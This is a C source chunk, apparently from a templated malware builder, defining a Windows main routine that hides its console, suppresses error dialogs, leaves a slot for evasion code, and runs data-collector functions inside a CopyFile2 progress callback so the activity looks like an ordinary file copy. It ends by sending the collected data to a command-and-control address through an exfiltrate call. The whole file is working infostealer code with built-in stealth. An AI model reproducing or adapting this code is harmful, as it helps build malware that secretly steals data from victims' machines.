// chunk: arch/callback_copyfile2
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h
// note: Executes collectors via CopyFile2 progress callback — looks like file operation

#ifndef CHUNK_ARCH_CALLBACK_COPYFILE2
#define CHUNK_ARCH_CALLBACK_COPYFILE2

typedef void (*collector_fn)(void);

static collector_fn g_callback_collectors[32];
static int g_callback_idx = 0;
static int g_callback_count = 0;

static COPYFILE2_MESSAGE_ACTION CALLBACK copy_progress_callback(
    const COPYFILE2_MESSAGE *pMessage, PVOID pvCallbackContext) {
    (void)pvCallbackContext;
    if (pMessage->Type == COPYFILE2_CALLBACK_CHUNK_FINISHED) {
        if (g_callback_idx < g_callback_count) {
            g_callback_collectors[g_callback_idx]();
            g_callback_idx++;
        }
    }
    return COPYFILE2_PROGRESS_CONTINUE;
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    FreeConsole();
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    collector_fn collectors[] = {
{{COLLECTOR_FN_LIST}}
    };
    g_callback_count = sizeof(collectors) / sizeof(collectors[0]);
    for (int i = 0; i < g_callback_count && i < 32; i++)
        g_callback_collectors[i] = collectors[i];

    /* Create a temp file with enough chunks to trigger one callback per collector */
    char tmp_src[MAX_PATH], tmp_dst[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp_src);
    lstrcatA(tmp_src, "cf2src.tmp");
    lstrcpyA(tmp_dst, tmp_src);
    tmp_dst[lstrlenA(tmp_dst) - 5] = 'd';

    HANDLE hf = CreateFileA(tmp_src, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        /* Write enough data for multiple chunk callbacks */
        char pad[4096];
        ZeroMemory(pad, sizeof(pad));
        for (int i = 0; i < g_callback_count + 2; i++) {
            DWORD written;
            WriteFile(hf, pad, sizeof(pad), &written, NULL);
        }
        CloseHandle(hf);

        COPYFILE2_EXTENDED_PARAMETERS params;
        ZeroMemory(&params, sizeof(params));
        params.dwSize = sizeof(params);
        params.dwCopyFlags = 0;
        params.pfCancel = NULL;
        params.pProgressRoutine = copy_progress_callback;
        params.pvCallbackContext = NULL;

        WCHAR wsrc[MAX_PATH], wdst[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, tmp_src, -1, wsrc, MAX_PATH);
        MultiByteToWideChar(CP_ACP, 0, tmp_dst, -1, wdst, MAX_PATH);
        CopyFile2(wsrc, wdst, &params);

        DeleteFileA(tmp_src);
        DeleteFileA(tmp_dst);
    }

    /* Run any remaining collectors that didn't fire via callback */
    while (g_callback_idx < g_callback_count) {
        g_callback_collectors[g_callback_idx]();
        g_callback_idx++;
    }

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
